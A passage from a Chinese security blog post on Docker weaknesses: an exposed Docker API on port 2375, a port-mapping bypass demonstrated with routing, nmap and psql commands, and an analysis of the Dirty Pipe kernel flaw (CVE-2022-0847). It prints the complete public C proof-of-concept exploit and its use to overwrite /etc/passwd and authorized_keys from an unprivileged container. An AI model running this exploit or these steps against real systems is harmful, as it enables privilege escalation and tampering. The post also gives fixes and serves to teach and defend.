<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>限制访问2375端口，不要对外网开放，在内网中需要设置严格的访问规则，修改docker swarm的认证方式，使用TLS认证，最简单的方法就是禁止外网访问或者设置白名单</p>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>fofa搜索：<code>port=&quot;2375&quot;</code></p>
<p>如果访问<code>ip:2375/version</code> <code>ip:2375/info</code>页面，返回一个json格式的值<code>&quot;message&quot;:&quot;page not found</code>即存在漏洞</p>
<h2 id="docker服务访问限制逃逸"><a href="#docker服务访问限制逃逸" class="headerlink" title="docker服务访问限制逃逸"></a>docker服务访问限制逃逸</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><strong>docker deamon会在启动container的时候向iptables中添加转发的规则。会创建一个filter chain - DOCKER</strong></p>
<p>docker利用这个规则向外暴露container的端口，该规则将端口暴露出了外网，导致可访问</p>
<p>docker添加了一条iptables规则：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">China DOCKER (2 references)</span><br><span class="line"></span><br><span class="line">pkts bytes target prot opt in out   source   destination</span><br><span class="line">ACCEPT tcp  --  !docker0 </span><br><span class="line">docker0 0.0.0.0/ 172.17.0.2  tcp</span><br><span class="line">dpt:80</span><br></pre></td></tr></table></figure>

<p>只要外部攻击者通过这台主机将流量发送到172.17.0.2：80，就会匹配这条规则并成功访问容器中的服务，127.0.0.1并没什么用（将端口映射到127.0.0.1的用户觉得安全的话，就gg了）</p>
<p>事实上不仅仅是127.0.0.1，你将容器端口映射到主机的任何一个地址，外部都可访问到，这很离谱</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>a：192.168.31.1</p>
<p>b：192.168.31.133</p>
<p>在a机器上运行一个postgresql容器，并将端口映射到127.0.0.1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -e POSTGRES_PASSWORD=password -p 127.0.0.1:5432 postgres</span><br></pre></td></tr></table></figure>

<p>同一个局域网中的B机器添加路由表，将所有访问172.16.0.0/12的流量指向a机器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip route add 172.16.0.0/12 via 192.168.31.1</span><br><span class="line"></span><br><span class="line">在b机器上扫描a机器的端口：</span><br><span class="line">nmap -p5432 -Pn --open 172.16.0.0/12</span><br></pre></td></tr></table></figure>

<p>在b机器中直接连接postgresql（密码：password）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -h 172.17.0.2 -U postgres</span><br></pre></td></tr></table></figure>

<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>首先要严格限制允许访问容器端口的源地址和网络接口，例如：docker run -p 127.0.0.1:5432:5432 的原iptables规则如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">China DOCKER (2 references)</span><br><span class="line"></span><br><span class="line">pkts bytes target prot opt in out source destination</span><br><span class="line">ACCEPT tcp -- !docker0</span><br><span class="line">docker0 0.0.0.0/ 172.17.0.2 tcp</span><br><span class="line">dpt:5432</span><br></pre></td></tr></table></figure>

<p>修改后为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">China DOCKER (2 references)</span><br><span class="line"></span><br><span class="line">pkts bytes target prot opt in out source destination</span><br><span class="line">ACCEPT tcp -- lo</span><br><span class="line">docker0 127.0.0.1/8 172.17.0.2 tcp</span><br><span class="line">dpt:5432</span><br></pre></td></tr></table></figure>

<p>同理，如果主机的地址为192.168.31.1，掩码为24，那么docker run -p 192.168.31.1:5432:5432的iptables规则就应该是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">China DOCKER (2 references)</span><br><span class="line"></span><br><span class="line">pkts bytes target prot opt in out source destination</span><br><span class="line">ACCEPT tcp -- eth0</span><br><span class="line">docker0 192.168.0.0/24 172.17.0.2 tcp</span><br><span class="line">tcp dpt:5432</span><br></pre></td></tr></table></figure>



<h1 id="容器渗透工具"><a href="#容器渗透工具" class="headerlink" title="容器渗透工具"></a>容器渗透工具</h1><h2 id="CDK：docker逃逸"><a href="#CDK：docker逃逸" class="headerlink" title="CDK：docker逃逸"></a>CDK：docker逃逸</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nkay10ZWFtL0NESw==">https://github.com/cdk-team/CDK</span></p>
<h1 id="CVE-2022-0847：脏管道漏洞分析及对容器的影响"><a href="#CVE-2022-0847：脏管道漏洞分析及对容器的影响" class="headerlink" title="CVE-2022-0847：脏管道漏洞分析及对容器的影响"></a>CVE-2022-0847：脏管道漏洞分析及对容器的影响</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>2022年2月23日， Linux内核发布<span class="exturl" data-url="aHR0cHM6Ly9naXQua2VybmVsLm9yZy9wdWIvc2NtL2xpbnV4L2tlcm5lbC9naXQvdG9ydmFsZHMvbGludXguZ2l0L2NvbW1pdC8/aWQ9OWQyMjMxYzVkNzRlMTNiMmEwNTQ2ZmVlNjczN2VlNDQ0NjAxNzkwMw==">漏洞补丁</span>， 修复了内核5.8及之后版本存在的任意文件覆盖的漏洞（CVE-2022-0847）， 该漏洞可导致普通用户本地提权至root特权， 因为与之前出现的<span class="exturl" data-url="aHR0cHM6Ly9kaXJ0eWNvdy5uaW5qYS8=">DirtyCow</span>（CVE-2016-5195）漏洞原理类似， 该漏洞被命名为DirtyPipe。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞简要原理是，调用 函数可以通过“零拷贝”的形式将文件发送到，代码层面的零拷贝是直接将文件缓存页（page cache）作为 的页使用。但这里引入了一个变量未初始化漏洞，导致文件缓存页会在后续 通道中被当成普通缓存页而被”续写”进而被篡改。然而，在这种情况下，内核并不会将这个缓存页判定为”脏页”，短时间内(到下次重启之类的)不会刷新到磁盘。在这段时间内所有访问该文件的场景都将使用被篡改的文件缓存页，也就达成了一个”短时间内对任意可读文件任意写”的操作。网上已经有对该漏洞的详细分析，本文不在详细介绍其原理，只做一些简单介绍，具体的关于漏洞的发现细节以及原理可参考文末链接的几篇文章：<code>splice()``pipe``pipe``buf``pipe``pipe</code></p>
<ul>
<li><p>管道</p>
<p>该漏洞别名为脏管道漏洞，管道（pipe）是Linux内核提供的一个进程间通信的方式。通过 函数创建，返回两个文件描述符，一个用于发送数据，另一个用于接受数据，类似管道的两段 。管道实现的源代码在fs/pipe.c中，在pipe.c中有很多函数，其中有两个函数比较重要，管道读函数pipe_read（）和管道写函数pipe_wrtie（） ，这里简要介绍以下pipe_write（）。<code>pipe/pipe2</code></p>
<p>Linux-5.13\fs\pipe.c ： 400 ： pipe_write（）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">if (chars &amp;&amp; !was_empty) &#123; </span><br><span class="line">      unsigned int mask = pipe-&gt;ring_size - 1;</span><br><span class="line">      struct pipe_buffer *buf = &amp;pipe-&gt;bufs[(head - 1) &amp; mask];</span><br><span class="line">      int offset = buf-&gt;offset + buf-&gt;len; </span><br><span class="line"></span><br><span class="line">      if ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">          offset + chars &lt;= PAGE_SIZE) &#123; </span><br><span class="line">            /*关键，如果PIPE_BUF_FLAG_CAN_MERGE 标志位存在，代表该页允许接着写</span><br><span class="line">             *如果写入长度不会跨页，则接着写，否则直接另起一页 */</span><br><span class="line">          ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">          ···</span><br><span class="line">          ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">          ···</span><br><span class="line">          &#125;</span><br><span class="line">          buf-&gt;len += ret;</span><br><span class="line">          ···</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>在使用pipe_write（）函数向管道中写入时，会判断当前页面是否带有 标记，如果不存在则不允许在当前页面续写， 默认初始化为 ，因为默认状态是允许页可以续写的 。<code>PIPE_BUF_FLAG_CAN_MERGE``flag``buf-&gt;flag``PIPE_BUF_FLAG_CAN_MERGE</code></p>
</li>
<li><p><code>Splice()</code></p>
<p>CPU管理的最小内存单位是一个页面（Page）， 一个页面通常为4kB大小， linux内存管理的最底层的一切都是关于页面的， 文件也是如此IO， 如果程序从文件中读取数据， 内核将先把它从磁盘读取到专属内核的中， 后续再把它从内核区域复制到用户程序的内存空间中;<code>页面缓存(Page Cache)</code></p>
<p>如果每一次都把文件数据从内核空间拷贝到用户空间, 将会拖慢系统的运行速度, 也会额外消耗很多内存空间, 所以出现了系统调用, 它的任务是从文件中获取数据并写入管道中, 期间一个特殊的实现方式便是: 目标文件的页面缓存数据不会直接复制到Pipe的环形缓冲区内, 而是以索引的方式(即 内存页框地址、偏移量、长度 所表示的一块内存区域)复制到了pipe_buffer的结构体中, 如此就避免了从内核空间向用户空间的数据拷贝过程, 所以被称为”零拷贝”。<code>splice()</code></p>
</li>
</ul>
<p>漏洞披露中给出了利用的poc：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="line">/*</span><br><span class="line"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="line"> *</span><br><span class="line"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="line"> *</span><br><span class="line"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="line"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="line"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="line"> * file contents in the page cache, even if the file is not permitted</span><br><span class="line"> * to be written, immutable or on a read-only mount.</span><br><span class="line"> *</span><br><span class="line"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="line"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="line"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="line"> * there before, it just provided an easy way to exploit it.</span><br><span class="line"> *</span><br><span class="line"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="line"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="line"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="line"> * cross a page boundary.</span><br><span class="line"> *</span><br><span class="line"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="line"> *</span><br><span class="line"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef PAGE_SIZE</span><br><span class="line">#define PAGE_SIZE 4096</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="line"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="line"> */</span><br><span class="line">static void prepare_pipe(int p[2])</span><br><span class="line">&#123;</span><br><span class="line">    if (pipe(p)) abort();</span><br><span class="line"></span><br><span class="line">    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);</span><br><span class="line">    static char buffer[4096];</span><br><span class="line"></span><br><span class="line">    /* fill the pipe completely; each pipe_buffer will now have</span><br><span class="line">       the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">    for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">        unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">        write(p[1], buffer, n);</span><br><span class="line">        r -= n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="line">       leaving the flags initialized) */</span><br><span class="line">    for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">        unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">        read(p[0], buffer, n);</span><br><span class="line">        r -= n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* the pipe is now empty, and if somebody adds a new</span><br><span class="line">       pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="line">       will be mergeable */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    if (argc != 4) &#123;</span><br><span class="line">        fprintf(stderr, &quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;, argv[0]);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* dumb command-line argument parser */</span><br><span class="line">    const char *const path = argv[1];</span><br><span class="line">    loff_t offset = strtoul(argv[2], NULL, 0);</span><br><span class="line">    const char *const data = argv[3];</span><br><span class="line">    const size_t data_size = strlen(data);</span><br><span class="line"></span><br><span class="line">    if (offset % PAGE_SIZE == 0) &#123;</span><br><span class="line">        fprintf(stderr, &quot;Sorry, cannot start writing at a page boundary\n&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;</span><br><span class="line">    const loff_t end_offset = offset + (loff_t)data_size;</span><br><span class="line">    if (end_offset &gt; next_page) &#123;</span><br><span class="line">        fprintf(stderr, &quot;Sorry, cannot write across a page boundary\n&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* open the input file and validate the specified offset */</span><br><span class="line">    const int fd = open(path, O_RDONLY); // yes, read-only! :-)</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        perror(&quot;open failed&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct stat st;</span><br><span class="line">    if (fstat(fd, &amp;st)) &#123;</span><br><span class="line">        perror(&quot;stat failed&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (offset &gt; st.st_size) &#123;</span><br><span class="line">        fprintf(stderr, &quot;Offset is not inside the file\n&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (end_offset &gt; st.st_size) &#123;</span><br><span class="line">        fprintf(stderr, &quot;Sorry, cannot enlarge the file\n&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* create the pipe with all flags initialized with</span><br><span class="line">       PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="line">    int p[2];</span><br><span class="line">    prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">    /* splice one byte from before the specified offset into the</span><br><span class="line">       pipe; this will add a reference to the page cache, but</span><br><span class="line">       since copy_page_to_iter_pipe() does not initialize the</span><br><span class="line">       &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br><span class="line">    --offset;</span><br><span class="line">    ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);</span><br><span class="line">    if (nbytes &lt; 0) &#123;</span><br><span class="line">        perror(&quot;splice failed&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    if (nbytes == 0) &#123;</span><br><span class="line">        fprintf(stderr, &quot;short splice\n&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* the following write will not create a new pipe_buffer, but</span><br><span class="line">       will instead write into the page cache, because of the</span><br><span class="line">       PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">    nbytes = write(p[1], data, data_size);</span><br><span class="line">    if (nbytes &lt; 0) &#123;</span><br><span class="line">        perror(&quot;write failed&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    if ((size_t)nbytes &lt; data_size) &#123;</span><br><span class="line">        fprintf(stderr, &quot;short write\n&quot;);</span><br><span class="line">        return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;It worked!\n&quot;);</span><br><span class="line">    return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从POC的角度可以看到漏洞利用的过程：</p>
<ol>
<li>创建pipe;</li>
<li>使用任意数据填充管道（填满， 而且是填满Pipe的最大空间）;</li>
<li>清空管道内数据;</li>
<li>使用splice（）读取目标文件（只读）的1字节数据发送至pipe;</li>
<li>write（）将任意数据继续写入pipe， 此数据将会覆盖目标文件内容;</li>
</ol>
<p>将该exp保存到本地编译，运行，可以成功触发。该漏洞 由linux 5.8 补丁 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvcnZhbGRzL2xpbnV4L2NvbW1pdC9mNmRkOTc1NTgzYmQ4Y2UwODg0MDA2NDhmZDk4MTllNDY5MWM4OTU4">f6dd975583bd</span> 引入~ 5.16.11、5.15.25、5.10.102 修复 ，处于中间阶段的内核版本可以触发该漏洞。触发必须要求文件有可读权限，且该漏洞写入时不能改变其文件大小。下图可以看到，在没有可写权限的情况下修改了testfile中的内容。只要挑选合适的目标文件， 利用漏洞Patch掉关键字段数据， 即可完成从普通用户到root用户的权限提升。</p>
<p><a target="_blank" rel="noopener" href="http://tva1.sinaimg.cn/large/006uFBysly1h397f7lv6fj30sf0a2wj9.jpg"><img data-src="http://tva1.sinaimg.cn/large/006uFBysly1h397f7lv6fj30sf0a2wj9.jpg" alt="img"></a></p>
<h2 id="脏管道对Linux容器的影响"><a href="#脏管道对Linux容器的影响" class="headerlink" title="脏管道对Linux容器的影响"></a>脏管道对Linux容器的影响</h2><p>前段时间的一个帖子记录了对Docker镜像进行逆向的过程， 容器镜像基本上是由一组相互重叠的层组成的。当容器启动时，运行时引擎（Docker、containerD、cri-O 等）将这些层合并在一起，并将生成的联合文件系统传递给进程。这些层始终是只读的，任何在容器中的操作都是都是在读写层中完成的，该层是使用<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQ29weS1vbi13cml0ZQ==">写时复制 (COW)</span>模式专门为每个容器实例创建的。这个读写层是暂时的层，当把容器停止运行时，该层会容器系统中删除。通过以只读模式（ –read-only ）启动容器可以省略读写层，从而有效地保护容器文件系统的完整性不会被攻击者破坏。</p>
<p>但是由于容器共享linux内核的缘故，容器并不能屏蔽内核漏洞，利用脏管道漏洞，可以几乎对任何文件系统进行修改，包括容器镜像。下面实验演示了如何利用脏管道漏洞对容器镜像的完整性进行破环。利用上述的exp，使用下列构建一个镜像，该镜像创建了一个非特权用户foo，并将exp复制到镜像中。<code>Dockerfile</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FROM debian:stable-slim</span><br><span class="line">RUN adduser foo</span><br><span class="line">USER foo</span><br><span class="line">COPY exp /exp</span><br></pre></td></tr></table></figure>

<p>Build 成功后的镜像</p>
<p><a target="_blank" rel="noopener" href="http://tva1.sinaimg.cn/large/006uFBysly1h397f7ooc4j30iz03n41a.jpg"><img data-src="http://tva1.sinaimg.cn/large/006uFBysly1h397f7ooc4j30iz03n41a.jpg" alt="img"></a></p>
<p>当使用只读模式启动容器时，是不能对容器的文件系统进行任何修改的，如下图。</p>
<p><a target="_blank" rel="noopener" href="http://tva1.sinaimg.cn/large/006uFBysly1h397f7n13nj30gn02tq4r.jpg"><img data-src="http://tva1.sinaimg.cn/large/006uFBysly1h397f7n13nj30gn02tq4r.jpg" alt="img"></a></p>
<p>接下来运行exp 对容器中的尝试进行修改，默认情况下，该文件是只读的，且只有root用户有权限进行更改。<code>/etc/passwd</code></p>
<p><a target="_blank" rel="noopener" href="http://tva1.sinaimg.cn/large/006uFBysly1h397f7lu4pj30mm09m7cr.jpg"><img data-src="http://tva1.sinaimg.cn/large/006uFBysly1h397f7lu4pj30mm09m7cr.jpg" alt="img"></a></p>
<p>然后退出该容器，再根据该镜像重新启动一个容器，可以发现在重新启动的容器中的文件也已经被更改，证明该镜像已经被持续的更改。但该更改并不是永久性的，短时间内的新建容器会出现这种情况。<code>passwd</code></p>
<p><a target="_blank" rel="noopener" href="http://tva1.sinaimg.cn/large/006uFBysly1h397f7p106j30gs04ggo6.jpg"><img data-src="http://tva1.sinaimg.cn/large/006uFBysly1h397f7p106j30gs04ggo6.jpg" alt="img"></a></p>
<p>在多个同一基础镜像容器同时启动的情况下，由于共享基础镜像，在某一容器中该漏洞的触发会波及到其他容器。下图演示了在其中一个只读容器中更改文件内容后，其他容器的文件系统也跟着发生了变化。</p>
<p><a target="_blank" rel="noopener" href="http://tva1.sinaimg.cn/large/006uFBysly1h397f7ohjeg30wr0nf100.gif"><img data-src="http://tva1.sinaimg.cn/large/006uFBysly1h397f7ohjeg30wr0nf100.gif" alt="img"></a></p>
<p>这就是容器的隔离性远不如虚拟机的地方，容器被称作为一种轻量级的操作系统虚拟化，多个容器与宿主据共享一个内核，这就导致了首先容器无法隔离宿主机出现的内核漏洞，一旦内核出了问题，很容器出现容器逃逸的情况；其次同一宿主机的容器之间的隔离性也不强，容器与容器之间很容器出现隐蔽通道、信息泄露的问题。</p>
<h2 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h2><p>漏洞披露：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kaXJ0eXBpcGUuY200YWxsLmNvbS8=">https://dirtypipe.cm4all.com/</span></p>
<p>breeze对该漏洞比较详细的分析报告</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NoZW5hb3RpYW4vQ1ZFLTIwMjItMDg0Nw==">https://github.com/chenaotian/CVE-2022-0847</span></p>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2022-08-24 09:25:48" itemprop="dateModified" datetime="2022-08-24T09:25:48+08:00">2022-08-24</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>qingjiegong <i class="ic i-at"><em>@</em></i>qingjiegong
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://example.com/2022/08/26/docker/" title="">http://example.com/2022/08/26/docker/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/08/26/hello-world/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclx29mstj20zk0m8hdt.jpg" title="Hello World">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>Hello World</h3>
  </a>

    </div>
    <div class="item right">
    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
